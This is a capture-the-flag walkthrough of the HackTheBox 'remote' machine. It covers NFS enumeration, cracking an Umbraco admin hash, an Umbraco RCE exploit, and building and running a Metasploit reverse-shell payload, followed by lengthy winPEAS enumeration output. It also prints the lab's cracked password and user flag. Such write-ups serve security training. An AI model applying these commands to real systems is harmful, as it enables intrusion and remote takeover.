# Hacking `remote` Guideline

Tbot Guideline

### Phase 1: Reconnaissance and Planning

```
We can get the information from the lab Hackthebox, try to gather information as much as we can
 - OS
 - Hostname
 - IP
 - ...
Access the page from IP in browser, check is there any thing interested ^^ 
```

### Phase 2: Scanning

- Since we know the IP of that server, we can take scan it with [nmap](https://nmap.org/)

```sh
$ nmap -sC -sV -A 10.10.10.180
Nmap scan report for 10.10.10.180
Host is up (0.38s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-02T18:19:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 441.08 seconds
```

- The result above show us that this server `remote` has open port `21/tcp ftp-anon` and `80/tcp http` also the information `2049/tcp nfs` look interested.
- Lets check is there any share folder with [Showmount](https://docs.oracle.com/cd/E19683-01/817-1717/rfsrefer-34/index.html)

```
$ sudo showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

- Huh... let mount it down to our local storage

```
$ sudo mkdir site_backups
$ sudo mount 10.10.10.180:/site_backups site_backups/
```

- From the website of it we can know this site was made from the [CMS Umbraco](https://umbraco.com/) so we can check where is the password of admin for that right?

```
$ cd App_Data/
$ strings Umbraco.sdf | grep admin

Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
...
```

- Copy the hash of Admin and put it file call `hash`, then using tool [John the Ripper](https://en.wikipedia.org/wiki/John_the_Ripper) with password list you can get from anywhere on the internet.

```
$ sudo john hash --format=Raw-SHA1 --wordlist=<your_folder_path>/rockyou.txt
...
?:baconandcheese
```

- Now you got these for the web-site admin page:
  * username: admin@htb.local
  * password: baconandcheese
- As we know the site was made by the [CMS Umbraco](https://umbraco.com/) so we can check its vulnerabilities on the internet and yeah... we can find out this beautiful script in [this repository](https://github.com/noraj/Umbraco-RCE/blob/master/exploit.py), just get it to your machine and ready for the attack.

### Phase 3: Gaining Access

- After you get enough informations and tools, now lets gain the normal user right on the machine. Remember the python script? Yeah, open it, read it for a while and then do this:

```
$ python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'ls c:'


Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name                                                                
----                -------------         ------ ----                                                                
d-----        2/19/2020   3:11 PM                Config                                                              
d-----        2/19/2020   3:11 PM                en                                                                  
d-----        2/19/2020   3:11 PM                en-US                                                               
d-----         7/5/2020  10:44 AM                History                                                             
d-----        2/19/2020   3:11 PM                MetaBack                                                            
-a----        2/19/2020   3:11 PM         252928 abocomp.dll                                                         
-a----        2/19/2020   3:11 PM         324608 adsiis.dll                                                          
-a----        2/19/2020   3:11 PM         119808 appcmd.exe                                                          
-a----        9/15/2018   3:14 AM           3810 appcmd.xml                                                          
-a----        2/19/2020   3:11 PM         181760 AppHostNavigators.dll                                               
-a----        2/19/2020   3:11 PM          80896 apphostsvc.dll                                                      
-a----        2/19/2020   3:11 PM         406016 appobj.dll                                                          
-a----        2/19/2020   3:11 PM         504320 asp.dll
...
```

- Beautiful! We just get into the Window powershell and show all the things in `C:/` folder. It's mean by using the script we can remotly controll it through the `powershell.exe`, so it's also mean we can upload out `reverse shell` to it and executing it remotely right? So let's start repare our `reverse shell`

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_machine_ip> LPORT=<your_machine_port> -f exe --platform windows > revesre_shell.exe
```

- The command you just type is provided by the power full tool that every hacker in this world have to know, it is [Metasploit](https://www.metasploit.com/). Not only help us to make a reverse shell but also it help us to create the hosting listener waiting for the call

```
$ msfconsole

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler)>
msf5 exploit(multi/handler)> set payload windows/meterpreter/reverse_tcp
# payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler)> set LHOST <your_machine_ip>
# LHOST => <your_machine_ip>
msf5 exploit(multi/handler)> set LPORT <your_machine_port>
# LPORT => <your_machine_port>
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting       Required  Description
   ----      ---------------       --------  -----------
   EXITFUNC  process               yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     <your_machine_ip>     yes       The listen address (an interface may be specified)
   LPORT     <your_machine_port>   yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target

msf5 exploit(multi/handler)> exploit

[*] Started reverse TCP handler on <your_machine_ip>:<your_machine_port>
```

- Now the host is ready for the call of `reverse shell` but how we can upload he `reverse shell` to server? Remember we got the password and admin user of the site? Yeah use it...
  1. First, get to the admin login page
  2. Then login with the information you have
  3. It will show the dashboard, then go to the Media tab
  4. Upload the `revesre_shell.exe` files
  5. After upload successful, then double-click on the files for see detail, you will see the path is `/media/1033/revesre_shell.exe`
- Okie, now our reverse shell is up there, we can use the python script earlier for getting it executed

```
$ python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'c:/inetpub/wwwroot/media/1033/revesre_shell.exe'
```

- After that, check the hosting listener we use Metasploit earlier

```
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on <your_machine_ip>:<your_machine_port>
[*] Sending stage (176195 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (<your_machine_ip>:<your_machine_port> -> 10.10.10.180:49707) at 2099-01-01 00:05:45 +0900

meterpreter >
```

- Now, type the magic world and let it amaze you

```
meterpreter > shell
Process 1612 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>
```

- It's time to get **User Flag** babe!!!

```
C:\windows\system32\inetsrv> more c:\Users\Public\user.txt
eb1e8b242ade516ccb4adb921be33f13
```

### Phase 4: Maintaining Access

- Now we are the normal user of the system. The next goal is to become `root user`. So until this step, you can go check the folders and programs and everything else by yourself but there are a smart move for it, which is [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), the power full tool to deep scan and report every information you need of the system. Let donwload `winPEAS.exe` to you local machine, then upload and executing it like we did it in **Phase 3** above. After executing it you will see some report like this:

<details>
  <summary>Click to expand!</summary>

```
winpeas.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
 Creating Dynamic lists, this could take a while, please wait...
 - Checking if domain...
 - Getting Win32_UserAccount info...
 - Creating current user groups list...
[X] Exception: Object reference not set to an instance of an object.
[X] Exception: The server could not be contacted.
 - Creating active users list...
 - Creating disabled users list...
 - Admin users list...
   
           *((,.,/((((((((((((((((((((/,  */                                                                                                           
    ,/*,..*((((((((((((((((((((((((((((((((((,                                                                                                         
  ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*                                                                                                      
  ((((((((((((((((**********/########## .(* ,(((((((                                                                                                   
  (((((((((((/********************/####### .(. (((((((                                                                                                 
  ((((((..******************/@@@@@/***/###### ./(((((((                                                                                                
  ,,....********************@@@@@@@@@@(***,#### .//((((((                                                                                              
  , ,..********************/@@@@@%@@@@/********##((/ /((((                                                                                             
  ..((###########*********/%@@@@@@@@@/************,,..((((                                                                                             
  .(##################(/******/@@@@@/***************.. /((                                                                                             
  .(#########################(/**********************..*((                                                                                             
  .(##############################(/*****************.,(((                                                                                             
  .(###################################(/************..(((                                                                                             
  .(#######################################(*********..(((                                                                                             
  .(#######(,.***.,(###################(..***.*******..(((                                                                                             
  .(#######*(#####((##################((######/(*****..(((                                                                                             
  .(###################(/***********(##############(...(((                                                                                             
  .((#####################/*******(################.((((((                                                                                             
  .(((############################################(..((((                                                                                              
  ..(((##########################################(..(((((                                                                                              
  ....((########################################( .(((((                                                                                               
  ......((####################################( .((((((                                                                                                
  (((((((((#################################(../((((((                                                                                                 
      (((((((((/##########################(/..((((((                                                                                                   
            (((((((((/,.  ,*//////*,. ./(((((((((((((((.                                                                                               
               (((((((((((((((((((((((((((((/                                                                                                          

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                 
                                                                                                                                                       
WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop                                                                                                                                                

[+] Leyend:
       Red                Indicates a special privilege over an object or something is misconfigured
       Green              Indicates that some protection is enabled or something is well configured
       Cyan               Indicates active users
       Blue               Indicates disabled users
       LightYellow        Indicates links

 [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation


==========================================(System Information)==========================================

[+] Basic System Information(T1082&T1124&T1012&T1497&T1212)
 [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits                                                                                                                                                     
  Hostname: remote
  ProductName: Windows Server 2019 Standard
  EditionID: ServerStandard
  ReleaseId: 1809
  BuildBranch: rs5_release
  CurrentMajorVersionNumber: 10
  CurrentVersion: 6.3
  Architecture: x86
  ProcessorCount: 4
  SystemLang: en-US
  KeyboardLang: English (United States)
  TimeZone: (UTC-05:00) Eastern Time (US & Canada)
  IsVirtualMachine: True
  Current Time: 7/5/2020 1:38:13 PM
  HighIntegrity: False
  PartOfDomain: False
  Hotfixes: KB4534119, KB4462930, KB4516115, KB4523204, KB4464455, 

[?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
  OS Build Number: 17763
     [!] CVE-2019-0836 : VULNERABLE
      [>] https://exploit-db.com/exploits/46718
      [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/                                                                                                                                                   

     [!] CVE-2019-0841 : VULNERABLE
      [>] https://github.com/rogue-kdc/CVE-2019-0841
      [>] https://rastamouse.me/tags/cve-2019-0841/

     [!] CVE-2019-1064 : VULNERABLE
      [>] https://www.rythmstick.net/posts/cve-2019-1064/

     [!] CVE-2019-1130 : VULNERABLE
      [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

     [!] CVE-2019-1253 : VULNERABLE
      [>] https://github.com/padovah4ck/CVE-2019-1253

     [!] CVE-2019-1315 : VULNERABLE
      [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

     [!] CVE-2019-1385 : VULNERABLE
      [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

     [!] CVE-2019-1388 : VULNERABLE
      [>] https://github.com/jas502n/CVE-2019-1388

     [!] CVE-2019-1405 : VULNERABLE
      [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/                                                                                                

  Finished. Found 9 potential vulnerabilities.

[+] PowerShell Settings()
  PowerShell v2 Version: 2.0
  PowerShell v5 Version: 5.1.17763.1
  Transcription Settings: 
  Module Logging Settings: 
  Scriptblock Logging Settings: 
  PS history file: 
  PS history size: 

[+] Audit Settings(T1012)
 [?] Check what is being logged 
  Not Found

[+] WEF Settings(T1012)
 [?] Windows Event Forwarding, is interesting to know were are sent the logs 
  Not Found

[+] LAPS Settings(T1012)
 [?] If installed, local administrator password is changed frequently and is restricted by ACL 
  LAPS Enabled: LAPS not installed

[+] Wdigest()
 [?] If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest
  Wdigest is not enabled

[+] LSA Protection()
 [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection                                                                       
  LSA Protection is not enabled

[+] Credentials Guard()
 [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard                                                                                                                                                        
  CredentialGuard is not enabled

[+] Cached Creds()
 [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials                                                                                                                         

[+] User Environment Variables()
 [?] Check for some passwords or keys in the env variables 
  Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
  PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  USERDOMAIN: IIS APPPOOL
  PROCESSOR_ARCHITECTURE: x86
  ProgramW6432: C:\Program Files
  DriverData: C:\Windows\System32\Drivers\DriverData
  PUBLIC: C:\Users\Public
  windir: C:\Windows
  PROMPT: $P$G
  CommonProgramW6432: C:\Program Files\Common Files
  TMP: C:\Windows\TEMP
  USERPROFILE: C:\Users\Default
  ProgramFiles: C:\Program Files (x86)
  PROCESSOR_LEVEL: 23
  ProgramData: C:\ProgramData
  COMPUTERNAME: REMOTE
  PROCESSOR_ARCHITEW6432: AMD64
  NUMBER_OF_PROCESSORS: 4
  PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
  SystemRoot: C:\Windows
  ComSpec: C:\Windows\system32\cmd.exe
  TEMP: C:\Windows\TEMP
  ProgramFiles(x86): C:\Program Files (x86)
  CommonProgramFiles: C:\Program Files (x86)\Common Files
  PROCESSOR_REVISION: 0102
  CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
  ALLUSERSPROFILE: C:\ProgramData
  SystemDrive: C:
  PSModulePath: %ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
  OS: Windows_NT
  USERNAME: DefaultAppPool

[+] System Environment Variables()
 [?] Check for some passwords or keys in the env variables 
  ComSpec: C:\Windows\system32\cmd.exe
  DriverData: C:\Windows\System32\Drivers\DriverData
  OS: Windows_NT
  Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
  PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  PROCESSOR_ARCHITECTURE: AMD64
  PSModulePath: C:\Program Files (x86)\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
  TEMP: C:\Windows\TEMP
  TMP: C:\Windows\TEMP
  USERNAME: SYSTEM
  windir: C:\Windows
  NUMBER_OF_PROCESSORS: 4
  PROCESSOR_LEVEL: 23
  PROCESSOR_IDENTIFIER: AMD64 Family 23 Model 1 Stepping 2, AuthenticAMD
  PROCESSOR_REVISION: 0102

[+] HKCU Internet Settings(T1012)
  User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  IE5_UA_Backup_Flag: 5.0
  ZonesSecurityUpgrade: System.Byte[]
  EnableNegotiate: 1
  ProxyEnable: 0

[+] HKLM Internet Settings(T1012)
  ActiveXCache: C:\Windows\Downloaded Program Files
  CodeBaseSearchPath: CODEBASE
  EnablePunycode: 1
  MinorVersion: 0
  WarnOnIntranet: 1

[+] Drives Information(T1120)
 [?] Remember that you should search more info inside the other drives 
  C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 18 GB)(Permissions: Users [AppendData/CreateDirectories])

[+] AV Information(T1063)
[X] Exception: Object reference not set to an instance of an object.
  No AV was detected!!
  Not Found

[+] UAC Status(T1012)
 [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                                                                                           
  ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
  EnableLUA: 1
  LocalAccountTokenFilterPolicy: 
  FilterAdministratorToken: 
    [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
    [-] Only the RID-500 local admin account can be used for lateral movement.                                                                         


===========================================(Users Information)===========================================

[+] Users(T1087&T1069&T1033)
 [?] Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups
Current user: 35mDefaultAppPool
Current groups: Everyone, Users, Service, Console Logon, Authenticated Users, This Organization, IIS_IUSRS, Local, S-1-5-82-0
 =================================================================================================

  REMOTE\Administrator: Built-in account for administering the computer/domain
      |->Password: CanChange-NotExpi-Req

  REMOTE\DefaultAccount(Disabled): A user account managed by the system.
      |->Password: CanChange-NotExpi-NotReq

  REMOTE\Guest(Disabled): Built-in account for guest access to the computer/domain
      |->Password: NotChange-NotExpi-NotReq

  REMOTE\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
      |->Password: CanChange-Expi-Req


[+] Current Token privileges(T1134)
 [?] Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation                                                                                                                                                       
  SeAssignPrimaryTokenPrivilege: DISABLED
  SeIncreaseQuotaPrivilege: DISABLED
  SeAuditPrivilege: DISABLED
  SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
  SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
  SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
  SeIncreaseWorkingSetPrivilege: DISABLED

[+] Clipboard text(T1134)


[+] Logged users(T1087&T1033)
  Not Found

[+] RDP Sessions(T1087&T1033)
  Not Found

[+] Ever logged users(T1087&T1033)
[X] Exception: System.Security.Principal.IdentityNotMappedException: Some or all identity references could not be translated.
 at System.Security.Principal.SecurityIdentifier.Translate(IdentityReferenceCollection sourceSids, Type targetType, Boolean forceSuccess)              
 at System.Security.Principal.SecurityIdentifier.Translate(Type targetType)                                                                            
 at winPEAS.UserInfo.GetEverLoggedUsers()                                                                                                              
  35mIIS APPPOOL\.NET v2.0 Classic
  35mIIS APPPOOL\.NET v4.5 Classic
  35mIIS APPPOOL\.NET v2.0
  35mIIS APPPOOL\.NET v4.5
  35mIIS APPPOOL\Classic .NET AppPool

[+] Looking for AutoLogon credentials(T1012)
  Not Found

[+] Home folders found(T1087&T1083&T1033)
  C:\Users\.NET v2.0
  C:\Users\.NET v2.0 Classic
  C:\Users\.NET v4.5
  C:\Users\.NET v4.5 Classic
  C:\Users\Administrator
  C:\Users\All Users
  C:\Users\Classic .NET AppPool
  C:\Users\Default
  C:\Users\Default User
  C:\Users\Public : Service [WriteData/CreateFiles]

[+] Password Policies(T1201)
 [?] Check for a possible brute-force 
[X] Exception: System.OverflowException: Negating the minimum value of a twos complement number is invalid.
 at System.TimeSpan.op_UnaryNegation(TimeSpan t)                                                                                                       
 at winPEAS.UserInfo.GetPasswordPolicy()                                                                                                               
  Domain: Builtin
  SID: S-1-5-32
  MaxPasswordAge: 42.22:47:31.7437440
  MinPasswordAge: 00:00:00
  MinPasswordLength: 0
  PasswordHistoryLength: 0
  PasswordProperties: 0
 =================================================================================================



=======================================(Processes Information)=======================================

[+] Interesting Processes -non Microsoft-(T1010&T1057&T1007)
 [?] Check if any interesting proccesses for memmory dump or if you could overwrite some binary running https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#running-processes                                                                                                                  
[X] Exception: System.Runtime.InteropServices.COMException (0x80070006): The handle is invalid. (Exception from HRESULT: 0x80070006 (E_HANDLE))
 at System.Runtime.InteropServices.Marshal.ThrowExceptionForHRInternal(Int32 errorCode, IntPtr errorInfo)                                              
 at System.Runtime.InteropServices.Marshal.FreeHGlobal(IntPtr hglobal)                                                                                 
 at winPEAS.SamServer.UNICODE_STRING.Dispose(Boolean disposing)                                                                                        
  revesre_shell(2148)[C:\inetpub\wwwroot\media\1033\revesre_shell.exe] -- POwn:35m DefaultAppPool
  Permissions: IIS_IUSRS [AllAccess],35m DefaultAppPool [AllAccess]
  Possible DLL Hijacking folder: C:\inetpub\wwwroot\media\1033 (IIS_IUSRS [AllAccess],35m DefaultAppPool [AllAccess])
  Command Line: "C:\inetpub\wwwroot\media\1033\revesre_shell.exe"
 =================================================================================================                                                     

  winpeas(916)[c:\inetpub\wwwroot\Media\1034\winpeas.exe] -- POwn:35m DefaultAppPool -- isDotNet
  Permissions: IIS_IUSRS [AllAccess],35m DefaultAppPool [AllAccess]
  Possible DLL Hijacking folder: c:\inetpub\wwwroot\Media\1034 (IIS_IUSRS [AllAccess],35m DefaultAppPool [AllAccess])
  Command Line: winpeas.exe
 =================================================================================================                                                     

  w3wp(4984)[c:\windows\system32\inetsrv\w3wp.exe] -- POwn:35m DefaultAppPool
  Command Line: c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm263f8db6-d586-4d21-b775-588c3984bcb5 -h "C:\inetpub\temp\apppools\DefaultAppPool\DefaultAppPool.config" -w "" -m 0 -t 20 -ta 0
 =================================================================================================

  conhost(3336)[C:\Windows\system32\conhost.exe] -- POwn:35m DefaultAppPool
  Command Line: \??\C:\Windows\system32\conhost.exe 0x4
 =================================================================================================

  cmd(1612)[C:\Windows\SysWOW64\cmd.exe] -- POwn:35m DefaultAppPool
  Command Line: C:\Windows\system32\cmd.exe
 =================================================================================================                                                     



========================================(Services Information)========================================

[+] Interesting Services -non Microsoft-(T1007)
 [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                                                     
  ALG(Application Layer Gateway Service)[C:\Windows\System32\alg.exe] - Manual - Stopped
  Provides support for 3rd party protocol plug-ins for Internet Connection Sharing
 =================================================================================================                                                     

  AppVClient(Microsoft App-V Client)[C:\Windows\system32\AppVClient.exe] - Disabled - Stopped
  Manages App-V users and virtual applications
 =================================================================================================                                                     

  diagnosticshub.standardcollector.service(Microsoft (R) Diagnostics Hub Standard Collector Service)[C:\Windows\system32\DiagSvcs\DiagnosticsHub.StandardCollector.Service.exe] - Manual - Stopped                                                                                                                
  Diagnostics Hub Standard Collector Service. When running, this service collects real time ETW events and processes them.
 =================================================================================================                                                     

  EFS(Encrypting File System (EFS))[C:\Windows\System32\lsass.exe] - Manual - Stopped
  Provides the core file encryption technology used to store encrypted files on NTFS file system volumes. If this service is stopped or disabled, applications will be unable to access encrypted files.                                                                                                          
 =================================================================================================                                                     

  IISADMIN(IIS Admin Service)[C:\Windows\system32\inetsrv\inetinfo.exe] - Auto - Running
  Enables this server to administer the IIS metabase. The IIS metabase stores configuration for the SMTP and FTP services. If this service is stopped, the server will be unable to configure SMTP or FTP. If this service is disabled, any services that explicitly depend on it will fail to start.             
 =================================================================================================                                                     

  KeyIso(CNG Key Isolation)[C:\Windows\system32\lsass.exe] - Manual - Running
  The CNG key isolation service is hosted in the LSA process. The service provides key process isolation to private keys and associated cryptographic operations as required by the Common Criteria. The service stores and uses long-lived keys in a secure process complying with Common Criteria requirements.   
 =================================================================================================                                                     

  MSDTC(Distributed Transaction Coordinator)[C:\Windows\System32\msdtc.exe] - Auto - Running
  Coordinates transactions that span multiple resource managers, such as databases, message queues, and file systems. If this service is stopped, these transactions will fail. If this service is disabled, any services that explicitly depend on it will fail to start.                                        
 =================================================================================================                                                     

  Netlogon(Netlogon)[C:\Windows\system32\lsass.exe] - Manual - Stopped
  Maintains a secure channel between this computer and the domain controller for authenticating users and services. If this service is stopped, the computer may not authenticate users and services and the domain controller cannot register DNS records. If this service is disabled, any services that explicitly depend on it will fail to start.                                                                                                                       
 =================================================================================================                                                     

  NfsService(Server for NFS)[C:\Windows\system32\nfssvc.exe] - Auto - Running
  Enables a Windows based computer to act as an NFS Server
 =================================================================================================                                                     

  RpcLocator(Remote Procedure Call (RPC) Locator)[C:\Windows\system32\locator.exe] - Manual - Stopped
  In Windows 2003 and earlier versions of Windows, the Remote Procedure Call (RPC) Locator service manages the RPC name service database. In Windows Vista and later versions of Windows, this service does not provide any functionality and is present for application compatibility.                           
 =================================================================================================                                                     

  SamSs(Security Accounts Manager)[C:\Windows\system32\lsass.exe] - Auto - Running
  The startup of this service signals other services that the Security Accounts Manager (SAM) is ready to accept requests.  Disabling this service will prevent other services in the system from being notified when the SAM is ready, which may in turn cause those services to fail to start correctly. This service should not be disabled.                                                                                                                              
 =================================================================================================                                                     

  SecurityHealthService(Windows Security Service)[C:\Windows\system32\SecurityHealthService.exe] - Manual - Stopped
  Windows Security Service handles unified device protection and health information
 =================================================================================================                                                     

  SensorDataService(Sensor Data Service)[C:\Windows\System32\SensorDataService.exe] - Disabled - Stopped
  Delivers data from a variety of sensors
 =================================================================================================                                                     

  SgrmBroker(System Guard Runtime Monitor Broker)[C:\Windows\system32\SgrmBroker.exe] - Manual - Stopped
  Monitors and attests to the integrity of the Windows platform.
 =================================================================================================                                                     

  SNMPTRAP(SNMP Trap)[C:\Windows\System32\snmptrap.exe] - Manual - Stopped
  Receives trap messages generated by local or remote Simple Network Management Protocol (SNMP) agents and forwards the messages to SNMP management programs running on this computer. If this service is stopped, SNMP-based programs on this computer will not receive SNMP trap messages. If this service is disabled, any services that explicitly depend on it will fail to start.                                                                                      
 =================================================================================================                                                     

  Spooler(Print Spooler)[C:\Windows\System32\spoolsv.exe] - Auto - Running
  This service spools print jobs and handles interaction with the printer.  If you turn off this service, you won't be able to print or see your printers.                                                                                                                                                        
 =================================================================================================                                                     

  sppsvc(Software Protection)[C:\Windows\system32\sppsvc.exe] - Auto - Stopped
  Enables the download, installation and enforcement of digital licenses for Windows and Windows applications. If the service is disabled, the operating system and licensed applications may run in a notification mode. It is strongly recommended that you not disable the Software Protection service.        
 =================================================================================================                                                     

  ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
  Agent to hold private keys used for public key authentication.
 =================================================================================================                                                     

  TeamViewer7(TeamViewer GmbH - TeamViewer 7)["C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe"] - Auto - Running
  TeamViewer Remote Software
 =================================================================================================                                                     

  TieringEngineService(Storage Tiers Management)[C:\Windows\system32\TieringEngineService.exe] - Manual - Stopped
  Optimizes the placement of data in storage tiers on all tiered storage spaces in the system.
 =================================================================================================                                                     

  UevAgentService(User Experience Virtualization Service)[C:\Windows\system32\AgentService.exe] - Disabled - Stopped
  Provides support for application and OS settings roaming
 =================================================================================================                                                     

  VaultSvc(Credential Manager)[C:\Windows\system32\lsass.exe] - Manual - Running
  Provides secure storage and retrieval of credentials to users, applications and security service packages.
 =================================================================================================                                                     

  vds(Virtual Disk)[C:\Windows\System32\vds.exe] - Manual - Stopped
  Provides management services for disks, volumes, file systems, and storage arrays.
 =================================================================================================                                                     

